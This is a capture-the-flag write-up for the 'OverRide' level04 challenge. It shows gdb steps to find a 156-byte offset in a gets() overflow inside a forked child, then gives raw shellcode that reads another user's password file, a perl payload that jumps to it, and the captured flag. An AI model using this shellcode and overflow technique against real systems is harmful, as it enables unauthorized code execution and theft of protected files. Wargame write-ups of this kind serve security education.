# level04

The program uses `gets` function to read stdin without checking size.

## Step 1. Calculate offset to overwrite `eip`
```assembly
level04@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" level04
[...]
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
=> 0x0804875e <+150>:	call   0x80484b0 <gets@plt>
[...]
```
```
level04@OverRide:~$ gdb -q level04
(gdb) set follow-fork-mode child
(gdb) break *0x0804875e
Breakpoint 1 at 0x804875e
(gdb) run
Starting program: /home/users/level04/level04
[New process 1952]
Give me some shellcode, k
[Switching to process 1952]

Breakpoint 1, 0x0804875e in main ()
(gdb) info registers eax
eax            0xffffd670	-10640
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x804875e in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
(gdb) print 0xffffd70c - 0xffffd670
$1 = 156
```
The program calls `fork` to create a new process, then its child process (pid == 0) calls `gets` to read stdin. We used `set follow-fork-mode child` to let GDB follow the child process and got offset `156` by calculating `eip - eax`.

## Step 2. Store the shellcode in the environment variable
```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	printf("%p\n", getenv("SHELLCODE"));
}

```
```
level04@OverRide:~$ export SHELLCODE=`perl -e 'print "\x90"x100, "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
level04@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv
level04@OverRide:~$ /tmp/getenv
0xffffd845
```
We put the shellcode in the environment variable and get the address by running a little C program.

## Step 3. Build the payload
```
level04@OverRide:~$ perl -e 'print "A"x156, pack("V", 0xffffd845)' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
